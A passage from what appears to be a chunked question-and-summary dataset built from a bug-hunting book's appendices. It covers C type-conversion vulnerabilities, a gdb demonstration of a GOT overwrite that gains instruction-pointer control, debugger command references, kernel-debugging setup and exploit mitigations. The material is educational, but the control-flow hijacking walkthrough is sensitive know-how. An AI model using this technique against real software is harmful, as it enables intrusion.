usually lead to a crash of the vulner-\nable component (denial of service). Depending on the particular\nprogramming error, NULL pointer dereferences can also lead to\narbitrary code execution.\nA.3 type Conversions in C\nThe C programming language is quite flexible in handling different\ndata types. For example, in C it’s easy to convert a character array\ninto a signed integer. There are two types of conversion: implicit and\nexplicit. In programming languages like C, implicit type conversion\noccurs when the compiler automatically converts a variable to a differ-\nent type. This usually happens when the initial variable type is incom-\npatible with the operation you are trying to perform. Implicit type\nconversions are also referred to as coercion.\nExplicit type conversion, also known as casting, occurs when the\nprogrammer explicitly codes the details of the conversion. This is usu-\nally done with the cast operator.\nHere is an example of an implicit type conversion (coercion):\n[..]\nunsigned int user_input = 0x80000000;\nsigned int length = user_input;\n[..]\nIn this example, an implicit conversion occurs between unsigned\nint and signed int.\n154 Appendix A\nAnd here is an example of an explicit type conversion (casting):\n[..]\nchar cbuf[] = \"AAAA\";\nsigned int si = *(int *)cbuf;\n[..]\nIn this example, an explicit conversion occurs between char and\nsigned int.\nType conversions can be very subtle and cause a lot of security\nbugs. Many of the vulnerabilities related to type conversion are the\nresult of conversions between unsigned and signed integers. Below is\nan example:\n01 #include <stdio.h>\n02\n03 unsigned int\n04 get_user_length (void)\n05 {\n06 return (0xffffffff);\n07 }\n08\n09 int\n10 main (void)\n11 {\n12 signed int length = 0;\n13\n14 length = get_user_length ();\n15\n16 printf (\"length: %d %u (0x%x)\\n\", length, length, length);\n17\n18 if (length < 12)\n19 printf (\"argument length ok\\n\");\n20 else\n21 printf (\"Error: argument length too long\\n\");\n22\n23 return 0;\n24 }\nListing A-3: A signed/unsigned conversion that leads to a vulnerability (implicit.c)\nThe source code in Listing A-3 contains a signed/unsigned con-\nversion vulnerability that is quite similar to the one I found in FFmpeg\n(see Chapter 4). Can you spot the bug?\nIn line 14, a length value is read in from user input and stored\nin the signed int variable length. The get_user_length() function is a\ndummy that always returns the “user input value” 0xffffffff. Let’s\nassume this is the value that was read from the network or from a data\nfile. In line 18, the program checks whether the user-supplied value\nHints for Hunting 155\nis less than 12. If it is, the string “argument length ok” will be printed\non the screen. Since length gets assigned the value 0xffffffff and this\nvalue is much bigger than 12, it may seem obvious that the string will\nnot be printed. However, let’s see what happens if we compile and\nrun the program under Windows Vista SP2:\nC:\\Users\\tk\\BHD>cl /nologo implicit.c\nimplicit.c\nC:\\Users\\tk\\BHD>implicit.exe\nlength: -1 4294967295 (0xffffffff)\nargument length ok\nAs you can see from the output, line 19 was reached and exe-\ncuted. How did this happen?\nOn a 32-bit machine, an unsigned int has a range of 0 to\n4294967295 and a signed int has a range of –2147483648 to 2147483647.\nThe unsigned int value 0xffffffff (4294967295) is represented in\nbinary as 1111 1111 1111 1111 1111 1111 1111 1111 (see Figure A-3). If\nyou interpret the same bit pattern as a signed int, there is a change\nin sign that results in a signed int value of –1. The sign of a number\nis indicated by the sign bit, which is usually represented by the Most\nSignificant Bit (MSB). If the MSB is 0, the number is positive, and if it\nis set to 1, the number is negative.\nMSB\nbinary signed int\nFF FF FF FF 1111 1111 1111 1111 1111 1111 1111 1111 -1\n7F FF FF FF 0111 1111 1111 1111 1111 1111 1111 1111 +2147483647\nMSB\nFigure A-3: The role of the Most Significant Bit (MSB)\nTo summarize: If an unsigned int is converted to a signed int\nvalue, the bit pattern isn’t changed, but the value is interpreted in\nthe context of the new type. If the unsigned int value is in the range\n0x80000000 to 0xffffffff, the resulting signed int will become negative\n(see Figure A-4).\nThis was only a brief introduction to implicit and explicit type\nconversions in C/C++. For a complete description of type conversions\nin C/C++ and associated security problems, see Mark Dowd, John\nMcDonald, and Justin Schuh’s The Art of Software Security Assessment:\nIdentifying and Avoiding Software Vulnerabilities (Addison-Wesley, 2007).\n156 Appendix A\nunsigned int signed int\n00 00 00 00 0 0\n7F FF FF FF 2147483647 +2147483647\n80 00 00 00 2147483648 -2147483648\nFF FF FF FF 4294967295 -1\nFigure A-4: Integer type conversion: unsigned int to signed int\n← I used Debian Linux 6.0\n(32-bit) as a platform for\nA.4 got overwrites all the following steps.\nOnce you have found a memory corruption vulnerability, you can use\na variety of techniques to gain control over the instruction pointer\nregister of the vulnerable process. One of these techniques, called\nGOT overwrite, works by manipulating an entry in the so-called Global\nOffset Table (GOT) of an Executable and Linkable Format (ELF)1 object to\ngain control over the instruction pointer. Since this technique relies\non the ELF file format, it works only on platforms supporting this\nformat (such as Linux, Solaris, or BSD).\nThe GOT is located in an ELF-internal data section called .got.\nIts purpose is to redirect position-independent address calculations\nto an absolute location, so it stores the absolute location of function-\ncall symbols used in dynamically linked code. When a program calls a\nlibrary function for the first time, the runtime link editor (rtld) locates\nthe appropriate symbol and relocates it to the GOT. Every new call to\nthat function passes the control directly to that location, so rtld isn’t\ncalled for that function anymore. Listing A-4 illustrates this process.\n01 #include <stdio.h>\n02\n03 int\n04 main (void)\n05 {\n06 int i = 16;\n07\n08 printf (\"%d\\n\", i);\n09 printf (\"%x\\n\", i);\n10\n11 return 0;\n12 }\nListing A-4: Example code used to demonstrate the function of the Global Offset Table (got.c)\nHints for Hunting 157\nThe program in Listing A-4 calls the printf() library function two\ntimes. I compiled the program with debugging symbols and started\nit in the debugger (see Section B.4 for a description of the following\ndebugger commands):\nlinux$ gcc -g -o got got.c\nlinux$ gdb -q ./got\n(gdb) set disassembly-flavor intel\n(gdb) disassemble main\nDump of assembler code for function main:\n0x080483c4 <main+0>: push ebp\n0x080483c5 <main+1>: mov ebp,esp\n0x080483c7 <main+3>: and esp,0xfffffff0\n0x080483ca <main+6>: sub esp,0x20\n0x080483cd <main+9>: mov DWORD PTR [esp+0x1c],0x10\n0x080483d5 <main+17>: mov eax,0x80484d0\n0x080483da <main+22>: mov edx,DWORD PTR [esp+0x1c]\n0x080483de <main+26>: mov DWORD PTR [esp+0x4],edx\n0x080483e2 <main+30>: mov DWORD PTR [esp],eax\n0x080483e5 <main+33>: call 0x80482fc <printf@plt>\n0x080483ea <main+38>: mov eax,0x80484d4\n0x080483ef <main+43>: mov edx,DWORD PTR [esp+0x1c]\n0x080483f3 <main+47>: mov DWORD PTR [esp+0x4],edx\n0x080483f7 <main+51>: mov DWORD PTR [esp],eax\n0x080483fa <main+54>: call 0x80482fc <printf@plt>\n0x080483ff <main+59>: mov eax,0x0\n0x08048404 <main+64>: leave\n0x08048405 <main+65>: ret\nEnd of assembler dump.\nThe disassembly of the main() function shows the address of\nprintf() in the Procedure Linkage Table (PLT). Much as the GOT redi-\nrects position-independent address calculations to absolute locations,\nthe PLT redirects position-independent function calls to absolute\nlocations.\n(gdb) x/1i 0x80482fc\n0x80482fc <printf@plt>: jmp DWORD PTR ds:0x80495d8\nThe PLT entry jumps immediately into the GOT:\n(gdb) x/1x 0x80495d8\n0x80495d8 <_GLOBAL_OFFSET_TABLE_+20>: 0x08048302\nIf the library function wasn’t called before, the GOT entry points\nback into the PLT. In the PLT, a relocation offset gets pushed onto\n158 Appendix A\nthe stack, and execution is redirected to the _init() function. This is\nwhere rtld gets called to locate the referenced printf() symbol.\n(gdb) x/2i 0x08048302\n0x8048302 <printf@plt+6>: push 0x10\n0x8048307 <printf@plt+11>: jmp 0x80482cc\nNow let’s see what happens if printf() gets called a second time.\nFirst, I defined a breakpoint just before the second call to printf():\n(gdb) list 0\n1 #include <stdio.h>\n2\n3 int\n4 main (void)\n5 {\n6 int i = 16;\n7\n8 printf (\"%d\\n\", i);\n9 printf (\"%x\\n\", i);\n10\n(gdb) break 9\nBreakpoint 1 at 0x80483ea: file got.c, line 9.\nI then started the program:\n(gdb) run\nStarting program: /home/tk/BHD/got\n16\nBreakpoint 1, main () at got.c:9\n9 printf (\"%x\\n\", i);\nAfter the breakpoint triggered, I disassembled the main function\nagain to see if the same PLT address was called:\n(gdb) disassemble main\nDump of assembler code for function main:\n0x080483c4 <main+0>: push ebp\n0x080483c5 <main+1>: mov ebp,esp\n0x080483c7 <main+3>: and esp,0xfffffff0\n0x080483ca <main+6>: sub esp,0x20\n0x080483cd <main+9>: mov DWORD PTR [esp+0x1c],0x10\n0x080483d5 <main+17>: mov eax,0x80484d0\n0x080483da <main+22>: mov edx,DWORD PTR [esp+0x1c]\n0x080483de <main+26>: mov DWORD PTR [esp+0x4],edx\n0x080483e2 <main+30>: mov DWORD PTR [esp],eax\n0x080483e5 <main+33>: call 0x80482fc <printf@plt>\n0x080483ea <main+38>: mov eax,0x80484d4\n0x080483ef <main+43>: mov edx,DWORD PTR [esp+0x1c]\nHints for Hunting 159\n0x080483f3 <main+47>: mov DWORD PTR [esp+0x4],edx\n0x080483f7 <main+51>: mov DWORD PTR [esp],eax\n0x080483fa <main+54>: call 0x80482fc <printf@plt>\n0x080483ff <main+59>: mov eax,0x0\n0x08048404 <main+64>: leave\n0x08048405 <main+65>: ret\nEnd of assembler dump.\nThe same address in the PLT was indeed called:\n(gdb) x/1i 0x80482fc\n0x80482fc <printf@plt>: jmp DWORD PTR ds:0x80495d8\nThe called PLT entry jumps immediately into the GOT again:\n(gdb) x/1x 0x80495d8\n0x80495d8 <_GLOBAL_OFFSET_TABLE_+20>: 0xb7ed21c0\nBut this time, the GOT entry of printf() has changed: It now\npoints directly to the printf() library function in libc.\n(gdb) x/10i 0xb7ed21c0\n0xb7ed21c0 <printf>: push ebp\n0xb7ed21c1 <printf+1>: mov ebp,esp\n0xb7ed21c3 <printf+3>: push ebx\n0xb7ed21c4 <printf+4>: call 0xb7ea1aaf\n0xb7ed21c9 <printf+9>: add ebx,0xfae2b\n0xb7ed21cf <printf+15>: sub esp,0xc\n0xb7ed21d2 <printf+18>: lea eax,[ebp+0xc]\n0xb7ed21d5 <printf+21>: mov DWORD PTR [esp+0x8],eax\n0xb7ed21d9 <printf+25>: mov eax,DWORD PTR [ebp+0x8]\n0xb7ed21dc <printf+28>: mov DWORD PTR [esp+0x4],eax\nNow if we change the value of the GOT entry for printf(), it’s\npossible to control the execution flow of the program when printf()\nis called:\n(gdb) set variable *(0x80495d8)=0x41414141\n(gdb) x/1x 0x80495d8\n0x80495d8 <_GLOBAL_OFFSET_TABLE_+20>: 0x41414141\n(gdb) continue\nContinuing.\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) info registers eip\neip 0x41414141 0x41414141\n160 Appendix A\nWe have achieved EIP control. For a real-life example of this\nexploitation technique, see Chapter 4.\nTo determine the GOT address of a library function, you can\neither use the debugger, as in the previous example, or you can use\nthe objdump or readelf command:\nlinux$ objdump -R got\ngot: file format elf32-i386\nDYNAMIC RELOCATION RECORDS\nOFFSET TYPE VALUE\n080495c0 R_386_GLOB_DAT __gmon_start__\n080495d0 R_386_JUMP_SLOT __gmon_start__\n080495d4 R_386_JUMP_SLOT __libc_start_main\n080495d8 R_386_JUMP_SLOT printf\nlinux$ readelf -r got\nRelocation section '.rel.dyn' at offset 0x27c contains 1 entries:\nOffset Info Type Sym.Value Sym. Name\n080495c0 00000106 R_386_GLOB_DAT 00000000 __gmon_start__\nRelocation section '.rel.plt' at offset 0x284 contains 3 entries:\nOffset Info Type Sym.Value Sym. Name\n080495d0 00000107 R_386_JUMP_SLOT 00000000 __gmon_start__\n080495d4 00000207 R_386_JUMP_SLOT 00000000 __libc_start_main\n080495d8 00000307 R_386_JUMP_SLOT 00000000 printf\nnotes\n1. For a description of ELF, see TIS Committee, Tool Interface Standard (TIS)\nExecutable and Linking Format (ELF) Specification, Version 1.2, 1995, at http://\nrefspecs.freestandards.org/elf/elf.pdf.\nHints for Hunting 161",
    "question": "What are the key concepts and examples discussed in this section about vulnerability classes, exploitation techniques, and common issues in software security?",
    "summary": "This appendix explains common vulnerability classes and exploitation techniques, including stack buffer overflows, null pointer dereferences, and type conversions in C. It provides examples of how these issues can be exploited to gain control over a program's execution flow. It also covers the Global Offset Table (GOT) overwrite technique, which allows attackers to redirect function calls by modifying entries in the GOT."
  },
  {
    "start": 69,
    "end": 80,
    "text": "B\nDeBugging\nThis appendix contains information about debuggers and the debug-\nging process.\nB.1 the solaris modular Debugger (mdb)\nThe following tables list some useful commands of the Solaris Modu-\nlar Debugger (mdb). For a complete list of available commands, see\nthe Solaris Modular Debugger Guide.1\nStarting and Stopping mdb\nCommand Description\nmdb program Starts mdb with program to debug .\nmdb unix.<n> vmcore.<n> Runs mdb on a kernel crash dump (unix.<n> and\nvmcore.<n> can typically be found in the directory\n/var/crash/<hostname>) .\n$q Exits the debugger .\nGeneral Commands\nCommand Description\n::run arguments Runs the program with the given arguments . If the\ntarget is currently running or it is a corefile, mdb will\nrestart the program if possible .\nBreakpoints\nCommand Description\naddress::bp Sets a new breakpoint at the address of the breakpoint\nlocation that is specified in the command .\n$b Lists information about existing breakpoints .\n::delete number Removes previously set breakpoints specified by their\nnumber .\nRunning the Debuggee\nCommand Description\n:s Executes a single instruction . Will step into\nsubfunctions .\n:e Executes a single instruction . Will not enter\nsubfunctions .\n:c Resumes execution .\nExamining Data\nCommand Description\naddress,count/format Prints the specified number of objects (count) found\nat address in the specified format; example formats\ninclude B (hexadecimal, 1-byte), X (hexadecimal,\n4-byte), S (string) .\n164 Appendix B\nInformation Commands\nCommand Description\n$r Lists registers and their contents .\n$c Prints a backtrace of all stack frames .\naddress::dis Dumps a range of memory around address as machine\ninstructions .\nOther Commands\nCommand Description\n::status Prints a summary of information related to the current\ntarget .\n::msgbuf Displays the message buffer, including all console\nmessages up to a kernel panic .\nB.2 the windows Debugger (winDbg)\nThe following tables list some useful debugger commands of WinDbg.\nFor a complete list of available commands, see Mario Hewardt and\nDaniel Pravat’s Advanced Windows Debugging (Addison-Wesley Profes-\nsional, 2007) or the documentation that comes with WinDbg.\nStarting and Stopping a Debugging Session\nCommand Description\nFile4Open Executable... Click Open Executable on the File menu to start\na new user-mode process and debug it .\nFile4Attach to a Process... Click Attach to a Process on the File menu to\ndebug a user-mode application that is currently\nrunning .\nq Ends the debugging session .\nDebugging 165\nGeneral Commands\nCommand Description\ng Begins or resumes execution on the target .\nBreakpoints\nCommand Description\nbp address Sets a new breakpoint at the address of the breakpoint\nlocation that is specified in the command .\nbl Lists information about existing breakpoints .\nbc breakpoint ID Removes previously set breakpoints specified by their\nbreakpoint ID .\nRunning the Debuggee\nCommand Description\nt Executes a single instruction or source line and, option-\nally, displays the resulting values of all registers and\nflags . Will step into subfunctions .\np Executes a single instruction or source line and,\noptionally, displays the resulting values of all registers\nand flags . Will not enter subfunctions .\nExamining Data\nCommand Description\ndd address Displays the contents of address as double-word val-\nues (4 bytes) .\ndu address Displays the contents of address as unicode\ncharacters .\ndt Displays information about a local variable, global\nvariable, or data type, including structures and\nunions .\npoi(address) Returns pointer-sized data from the specified address .\nDepending on the architecture the pointer size is\n32 bits or 64 bits .\n166 Appendix B\nInformation Commands\nCommand Description\nr Lists registers and their contents .\nkb Prints a backtrace of all stack frames .\nu address Dumps a range of memory around address as machine\ninstructions .\nOther Commands\nCommand Description\n!analyze -v This debugger extension displays a lot of useful infor-\nmation about an exception or bug check .\n!drvobj DRIVER_OBJECT This debugger extension displays detailed information\nabout a DRIVER_OBJECT .\n.sympath This command changes the default path of the debug-\nger for symbol search .\n.reload This command deletes all symbol information and\nreloads these symbols as needed .\nB.3 windows kernel Debugging\nIn order to analyze the vulnerability described in Chapter 6, I needed\na way to debug the Windows kernel. I set up a debugging environment\nwith VMware2 and WinDbg3 by following these steps:\n• Step 1: Configure the VMware guest system for ← Throughout\nthis\nremote kernel debugging. section, I used the\nfollowing software\n• Step 2: Adjust the boot.ini of the guest system. versions: VMware\n• Step 3: Configure WinDbg on the VMware host a\nW\nn\no\nd\nr k\nW\nst\nin\nat\nD\nio\nb\nn\ng\n6.5.2\nfor Windows kernel debugging. 6.10.3.233.\nStep 1: Configure the VMware Guest System for Remote Kernel\nDebugging\nAfter I installed a Windows XP SP3 VMware guest system, I powered it\noff and chose Edit Virtual Machine Settings from the Commands sec-\ntion of VMware. I then clicked the Add button to add a new serial port\nand chose the configuration settings shown in Figures B-1 and B-2.\nDebugging 167\nFigure B-1: Output to named pipe\nFigure B-2: Named pipe configuration\nAfter the new serial port was successfully added, I selected the\nYield CPU on poll checkbox of the “I/O mode” section, as shown in\nFigure B-3.\n168 Appendix B\nFigure B-3: Configuration settings for the new serial port\nStep 2: Adjust the boot.ini of the Guest System\nI then powered up the VMware guest system and edited the boot.ini\nfile of Windows XP to contain the following entries (the bold one\nenabled kernel debugging):\n[boot loader]\ntimeout=30\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=\"Microsoft Windows XP Professional\" /\nnoexecute=optin /fastdetect\nmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=\"Microsoft Windows XP Professional -\nDebug\" /fastdetect /debugport=com1\nI then rebooted the guest system and chose the new entry Micro-\nsoft Windows XP Professional – Debug [debugger enabled] from the\nboot menu to start the system, as shown in Figure B-4.\nDebugging 169\nFigure B-4: New boot menu option\nStep 3: Configure WinDbg on the VMware Host for Windows\nKernel Debugging\nThe only thing left was to configure WinDbg on the VMware host so\nthat it attached to the kernel of the VMware guest system using a pipe.\nTo do this, I created a batch file with the content shown in Figure B-5.\nFigure B-5: WinDbg batch file for kernel debugging\nI then double-clicked the batch file to attach WinDbg on the\nVMware host to the kernel of the VMware Windows XP guest system,\nas shown in Figure B-6.\n170 Appendix B\nFigure B-6: Attaching the kernel debugger (WinDbg)\nB.4 the gnu Debugger (gdb)\nThe following tables list some useful commands of the GNU Debug-\nger (gdb). For a complete list of available commands, see the gdb\nonline documentation.4\nStarting and Stopping gdb\nCommand Description\ngdb program Starts gdb with program to debug .\nquit Exits the debugger .\nGeneral Commands\nCommand Description\nrun arguments Starts debugged program (with arguments) .\nattach processID Attaches the debugger to the running process with\nprocessID .\nDebugging 171\nBreakpoints\nCommand Description\nbreak <file:> function Sets a breakpoint at the beginning of the specified\nfunction (in file) .\nbreak <file:> line number Sets a breakpoint at the start of the code for that\nline number (in file) .\nbreak *address Sets a breakpoint at the specified address .\ninfo breakpoints Lists information about existing breakpoints .\ndelete number Removes previously set breakpoints specified by\ntheir number .\nRunning the Debuggee\nCommand Description\nstepi Executes one machine instruction . Will step into\nsubfunctions .\nnexti Executes one machine instruction . Will not enter\nsubfunctions .\ncontinue Resumes execution .\nExamining Data\nCommand Description\nx/CountFormatSize Prints the specified number of objects (Count) of the\naddress specified Size according to the Format at address .\nSize: b (byte), h (halfword), w (word), g (giant, 8 bytes) .\nFormat: o (octal), x (hexadecimal), d (decimal), u\n(unsigned decimal), t (binary), f (float), a (address),\ni (instruction), c (char), s (string) .\nInformation Commands\nCommand Description\ninfo registers Lists registers and their contents .\nbacktrace Prints a backtrace of all stack frames .\ndisassemble address Dumps a range of memory around address as machine\ninstructions .\n172 Appendix B\nOther Commands\nCommand Description\nset disassembly-flavor intel|att Sets the disassembly flavor to Intel or\nAT&T assembly syntax . Default is AT&T\nsyntax .\nshell command Executes a shell command .\nset variable *(address)=value Stores value at the memory location\nspecified by address .\nsource file Reads debugger commands from a file .\nset follow-fork-mode parent|child Tells the debugger to follow the child or\nparent process .\nB.5 using linux as a mac os x kernel-\nDebugging Host\nIn this section, I will detail the steps I performed to prepare a Linux\nsystem as a debugging host for the Mac OS X kernel:\n• Step 1: Install an ancient Red Hat 7.3 Linux operating system.\n• Step 2: Get the necessary software packages.\n• Step 3: Build Apple’s debugger on the Linux host.\n• Step 4: Prepare the debugging environment.\nStep 1: Install an Ancient Red Hat 7.3 Linux Operating System\nBecause Apple’s GNU Debugger (gdb) version that I used needs a\nGNU C Compiler (gcc) less than version 3 to build correctly, I down-\nloaded and installed an ancient Red Hat 7.3 Linux system.5 To install\nthe Red Hat system, I chose the installation type Custom. When I was\nasked to select the packages to install (Package Group Selection),\nI chose only the packages Network Support and Software Develop-\nment, as well as OpenSSH server from the individual package selec-\ntion. These packages include all the necessary development tools and\nlibraries to build Apple’s gdb under Linux. During the installation,\nI added an unprivileged user called tk with a home directory under\n/home/tk.\nDebugging 173\nStep 2: Get the Necessary Software Packages\nAfter I had successfully installed the Linux host, I downloaded the fol-\nlowing software packages:\n• Source code of Apple’s custom gdb version.6\n• Standard gdb source code from GNU.7\n• A patch for Apple’s gdb to compile under Linux.8\n• The appropriate source code version of the XNU kernel. I\nprepared the Linux debugging host to research the kernel\nbug described in Chapter 7, so I downloaded the XNU version\n792.13.8.9\n• The appropriate version of Apple’s Kernel Debug Kit. I found the\nbug explored in Chapter 7 on Mac OS X 10.4.8, so I downloaded\nthe corresponding Kernel Debug Kit version 10.4.8 (Kernel_Debug_\nKit_10.4.8_8L2127.dmg).\nStep 3: Build Apple’s Debugger on the Linux Host\nAfter I downloaded the necessary software packages onto the Linux\nhost, I unpacked the two versions of gdb:\nlinux$ tar xvzf gdb-292.tar.gz\nlinux$ tar xvzf gdb-5.3.tar.gz\nThen I replaced the mmalloc directory of Apple’s source tree with\nthe one from GNU gdb:\nlinux$ mv gdb-292/src/mmalloc gdb-292/src/old_mmalloc\nlinux$ cp -R gdb-5.3/mmalloc gdb-292/src/\nI applied the patch to Apple’s gdb version:\nlinux$ cd gdb-292/src/\nlinux$ patch -p2 < ../../osx_gdb.patch\npatching file gdb/doc/stabs.texinfo\npatching file gdb/fix-and-continue.c\npatching file gdb/mach-defs.h\npatching file gdb/macosx/macosx-nat-dyld.h\npatching file gdb/mi/mi-cmd-stack.c\nI used the following commands to build the necessary libraries:\nlinux$ su\nPassword:\n174 Appendix B\nlinux# pwd\n/home/tk/gdb-292/src\nlinux# cd readline\nlinux# ./configure; make\nlinux# cd ../bfd\nlinux# ./configure --target=i386-apple-darwin --program-suffix=_osx; make; →\nmake install\nlinux# cd ../mmalloc\nlinux# ./configure; make; make install\nlinux# cd ../intl\nlinux# ./configure; make; make install\nlinux# cd ../libiberty\nlinux# ./configure; make; make install\nlinux# cd ../opcodes\nlinux# ./configure --target=i386-apple-darwin --program-suffix=_osx; make; →\nmake install\nTo build the debugger itself, I needed to copy some header files\nfrom the XNU kernel source code to the include directory of the\nLinux host:\nlinux# cd /home/tk\nlinux# tar -zxvf xnu-792.13.8.tar.gz\nlinux# cp -R xnu-792.13.8/osfmk/i386/ /usr/include/\nlinux# cp -R xnu-792.13.8/bsd/i386/ /usr/include/\ncp: overwrite `/usr/include/i386/Makefile'? y\ncp: overwrite `/usr/include/i386/endian.h'? y\ncp: overwrite `/usr/include/i386/exec.h'? y\ncp: overwrite `/usr/include/i386/setjmp.h'? y\nlinux# cp -R xnu-792.13.8/osfmk/mach /usr/include/\nI then commented some typedefs in the new _types.h file to avoid\ncompile-time conflicts (see line 39, lines 43 to 49, and lines 78 to 81):\nlinux# vi +38 /usr/include/i386/_types.h\n[..]\n38 #ifdef __GNUC__\n39 // typedef __signed char __int8_t;\n40 #else /* !__GNUC__ */\n41 typedef char __int8_t;\n42 #endif /* !__GNUC__ */\n43 // typedef unsigned char __uint8_t;\n44 // typedef short __int16_t;\n45 // typedef unsigned short __uint16_t;\n46 // typedef int __int32_t;\n47 // typedef unsigned int __uint32_t;\n48 // typedef long long __int64_t;\n49 // typedef unsigned long long __uint64_t;\n..\nDebugging 175\n78 //typedef union {\n79 // char __mbstate8[128];\n80 // long long _mbstateL; /* for alignment */\n81 //} __mbstate_t;\n[..]\nI added a new include to the file /home/tk/gdb-292/src/gdb/macosx/\ni386-macosx-tdep.c (see line 24):\nlinux# vi +24 /home/tk/gdb-292/src/gdb/macosx/i386-macosx-tdep.c\n[..]\n24 #include <string.h>\n25 #include \"defs.h\"\n26 #include \"frame.h\"\n27 #include \"inferior.h\"\n[..]\nFinally, I compiled the debugger with the following commands:\nlinux# cd gdb-292/src/gdb/\nlinux# ./configure --target=i386-apple-darwin --program-suffix=_osx --disable-gdbtk\nlinux# make; make install\nAfter the compilation completed, I ran the new debugger\nas root so that the necessary directories could be created under\n/usr/local/bin/:\nlinux# cd /home/tk\nlinux# gdb_osx -q\n(gdb) quit\nAfter that, the debugger was ready.\nStep 4: Prepare the Debugging Environment\nI unpacked the downloaded Kernel Debug Kit disk image file (dmg)\nunder Mac OS X, transferred the files per scp to the Linux host, and\nnamed the directory KernelDebugKit_10.4.8. I also copied the XNU\nsource code into the search path of the debugger:\nlinux# mkdir /SourceCache\nlinux# mkdir /SourceCache/xnu\nlinux# mv xnu-792.13.8 /SourceCache/xnu/\nIn Chapter 7, I described how the newly built kernel debugger\ncan be used to connect to a Mac OS X machine.\n176 Appendix B\nnotes\n1. See the Solaris Modular Debugger Guide at http://dlc.sun.com/osol/docs/content/\nMODDEBUG/moddebug.html.\n2. See http://www.vmware.com/.\n3. See http://www.microsoft.com/whdc/DevTools/Debugging/default.mspx.\n4. See http://www.gnu.org/software/gdb/documentation/.\n5. There are still a few download mirror sites available where you can get\nthe Red Hat 7.3 ISO images. Here are a few, as of this writing: http://ftp-stud\n.hs-esslingen.de/Mirrors/archive.download.redhat.com/redhat/linux/7.3/de/iso/\ni386/, http://mirror.fraunhofer.de/archive.download.redhat.com/redhat/linux/7.3/\nen/iso/i386/, and http://mirror.cs.wisc.edu/pub/mirrors/linux/archive.download\n.redhat.com/redhat/linux/7.3/en/iso/i386/.\n6. Apple’s custom gdb version can be downloaded at http://www.opensource\n.apple.com/tarballs/gdb/gdb-292.tar.gz.\n7. The standard gdb version from GNU can be downloaded at http://ftp.gnu\n.org/pub/gnu/gdb/gdb-5.3.tar.gz.\n8. The patch for Apple’s GNU debugger is available at http://www.trapkit.de/\nbooks/bhd/osx_gdb.patch.\n9. The XNU version 792.13.8 can be downloaded at http://www.opensource\n.apple.com/tarballs/xnu/xnu-792.13.8.tar.gz.\nDebugging 177",
    "question": "",
    "summary": "This appendix provides an overview of debuggers and the debugging process, including commands for Solaris Modular Debugger (mdb), Windows Debugger (winDbg), GNU Debugger (gdb), and setting up Linux as a host for Mac OS X kernel debugging. It details the setup steps for each debugger and the necessary configurations to enable kernel debugging on different operating systems. The text also includes notes on where to find additional resources and documentation for each debugger."
  },
  {
    "start": 81,
    "end": 83,
    "text": "C\nmitigAtion\nThis appendix contains information about mitigation techniques.\nC.1 exploit mitigation techniques\nVarious exploit mitigation techniques and mechanisms available today\nare designed to make exploiting memory corruption vulnerabilities as\ndifficult as possible. The most prevalent ones are these:\n• Address Space Layout Randomization (ASLR)\n• Security Cookies (/GS), Stack-Smashing Protection (SSP), or\nStack Canaries\n• Data Execution Prevention (DEP) or No eXecute (NX)\nThere are other mitigation techniques that are bound to an oper-\nating system platform, a special heap implementation, or a file format\nlike SafeSEH, SEHOP, or RELRO (see Section C.2). There are also\nvarious heap mitigation techniques (heap cookies, randomization,\nsafe unlinking, etc.).\nThe many mitigation techniques could easily fill another book, so\nI will focus on the most prevalent ones, as well as on some tools used\nto detect them.\nnote There is a continuous race between exploit mitigation techniques and\nways of bypassing them. Even systems using all of these mechanisms\nmay be successfully exploited under certain circumstances.\nAddress Space Layout Randomization (ASLR)\nASLR randomizes the location of key areas of a process space (usu-\nally the base address of the executable, the position of the stack, the\nheap, the libraries, and others) to prevent an exploit writer from pre-\ndicting target addresses. Say you find a write4 primitive vulnerability that\npresents you with the opportunity to write 4 bytes of your choosing\nto any memory location you like. That gives you a powerful exploit if\nyou choose a stable memory location to overwrite. If ASLR is in place,\nit’s much harder to find a reliable memory location to overwrite. Of\ncourse, ASLR is effective only if it’s implemented correctly.1\nSecurity Cookies (/GS), Stack-Smashing Protection (SSP), or Stack\nCanaries\nThese methods normally inject a canary or cookie into a stack frame\nto protect the function’s metadata associated with procedure invoca-\ntion (e.g., the return address). Before the return address is processed,\nthe validity of the cookie or canary is checked, and the data in the\nstack frame is reorganized to protect the pointers and arguments of\nthe function. If you find a stack buffer overflow in a function that is\nprotected by this mitigation technique, exploitation can be tough.2\nNX and DEP\nThe No eXecute (NX) bit is a CPU feature that helps prevent code\nexecution from data pages of a process. Many modern operating\nsystems take advantage of the NX bit. Under Microsoft Windows,\nhardware-enforced Data Execution Prevention (DEP) enables the NX bit\non compatible CPUs and marks all memory locations in a process as\nnonexecutable unless the location explicitly contains executable code.\nDEP was introduced in Windows XP SP2 and Windows Server 2003\nSP1. Under Linux, NX is enforced by the kernel on 64-bit CPUs of\nAMD and Intel. ExecShield3 and PaX4 emulate the NX functionality\non older 32-bit x86 CPUs under Linux.\n180 Appendix C\nDetecting Exploit Mitigation Techniques\nBefore you can try to circumvent these mitigation techniques, you\nhave to determine which ones an application or a running process\nactually uses.\nMitigations can be controlled by system policy, by special APIs,\nand by compile-time options. For example, the default system-wide\nDEP policy for Windows client–operating systems is called OptIn. In\nthis mode of operation, DEP is enabled only for processes that explicitly\nopt in to DEP. There are different ways to opt a process in to DEP. For\nexample, you could use the appropriate linker switch (/NXCOMPAT)\nat compile time, or you could use the SetProcessDEPPolicy API to allow\nan application to opt in to DEP programmatically. Windows supports\nfour system-wide configurations for hardware-enforced DEP.5 On Win-\ndows Vista and later, you can use the bcdedit.exe console application\nto verify the system-wide DEP policy, but this must be done from an\nelevated Windows command prompt. To verify the DEP and ASLR set-\ntings of an application, you can use Sysinternals’s Process Explorer.6\nnote To configure Process Explorer so that it shows the processes’ DEP and\nASLR status, add the following columns to the view: View4Select\nColumns4DEP Status and View4Select Columns4ASLR Enabled.\nAdditionally, set the lower pane to view DLLs for a process and add\nthe “ASLR Enabled” column to the view (see Figure C-1).\nThe newer versions of Windows (Vista or later) also support ASLR\nby default, but the DLLs and EXEs must opt in to support ASLR using\nthe /DYNAMICBASE linker option. It is important to note that pro-\ntection is significantly weaker if not all modules of a process opt in to\nASLR. In practice, the effectiveness of mitigations like DEP and ASLR\nis heavily dependent on how completely each mitigation technology\nhas been enabled by an application.7\nFigure C-1 shows an example of Process Explorer being used to\nobserve the DEP and ASLR settings of Internet 